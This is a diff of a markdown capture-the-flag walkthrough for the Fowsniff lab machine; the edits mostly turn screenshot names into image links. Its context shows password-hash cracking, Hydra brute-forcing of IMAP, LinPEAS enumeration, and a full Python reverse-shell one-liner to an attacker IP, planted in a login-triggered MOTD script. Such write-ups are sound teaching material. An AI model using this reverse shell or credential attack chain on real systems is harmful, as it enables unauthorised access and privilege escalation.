@@ -59,15 +59,15 @@ Nmap done: 1 IP address (1 host up) scanned in 12.49 seconds
 
 Navigating to the site on port 80 we find that there has been a security breach and services are down. We also find a note that the company's Twitter has also been hacked.
 
-site.png
+![site.png](../assets/fowsniff_assets/site.png)
 
 Heading to the Twitter page we find a link to a PasteBin page with what sounds like a password dump:
 
-twitter.png
+![twitter.png](../assets/fowsniff_assets/twitter.png)
 
-The PasteBin link had been removed, but I was able to still access the contents using the wayback machine:
+The Pastebin link had been removed, but I was able to still access the contents using the wayback machine:
 
-wayback.png
+![wayback.png](../assets/fowsniff_assets/wayback.png)
 
 The dump included:
 
@@ -168,7 +168,7 @@ f7fd98d380735e859f8b2ffbbede5a7e
 
 Now lets copy these into https://crackstation.net/ and see if we can crack any of them:
 
-cracked.png
+![cracked.png](../assets/fowsniff_assets/cracked.png)
 
 Cool, CrackStation was able to crack all but one of the passwords. Lets add these to a file called pass.txt:
 
@@ -188,7 +188,7 @@ orlando12
 
 Lets take our users list and our password list and use Hydra to see if we can bruteforce Imap:
 
-scooby.png
+![scooby.png](../assets/fowsniff_assets/scooby.png)
 
 Nice, Hydra found valid credentials!
 
@@ -292,7 +292,7 @@ PS: Make sure you change your email password.
 AJ had been telling us to do that right before Captain Profanity showed up.
 ```
 
-Nice, we've found the new temporary SSH credential! Trying to login as user seina, we see that they followed the advice and changed the passsword:
+Nice, we've found the new temporary SSH credential! Trying to login as user seina, we see that they followed instructions and changed the passsword:
 
 ```text
 ┌──(ryan㉿kali)-[~/THM/Fowsniff_CTF]
@@ -309,21 +309,21 @@ seina@10.10.63.19's password:
 
 Lets go back to Hydra and our username list and see if anyone on the team hasn't updated the password yet:
 
-hydra2.png
+![hydra2.png](../assets/fowsniff_assets/hydra2.png)
 
 Cool, looks like these credentials will work for user baksteen:
 
-ssh.png
+![ssh.png](../assets/fowsniff_assets/ssh.png)
 
 Cool, we are now logged in as user baksteen. Looking around I'm not seeing any user.txt or local.txt flags.
 
 Lets upload a copy of LinPEAS.sh to the `/tmp` directory to help find a privilege escalation vector:
 
-tansfer.png
+![transfer.png](../assets/fowsniff_assets/transfer.png)
 
 LinPEAS finds an insteresting file which is writable:
 
-group.png 
+![group.png](../assets/fowsniff_assets/group.png) 
 
 And if we view the 00-header file in `/etc/update-motd.d/` we find it executes `/opt/cube/cube.sh` when someone logs into SSH. `sh /opt/cube/cube.sh` 
 
@@ -332,15 +332,15 @@ So, looks like we should be able to overwrite a reverse shell to the file, set u
 ```text
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.61.45",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
-cube.png
+![cube.png](../assets/fowsniff_assets/cube.png)
 
 We can then set up a listener and SSH back into the machine to catch a shell back
 
-root_shell.png
+![root_shell.png](../assets/fowsniff_assets/root_shell.png)
 
 From there we can see the root.txt flag!
 
-root_flag.png
+![root_flag.png](../assets/fowsniff_assets/root_flag.png)
 
 Thanks for following along!
 
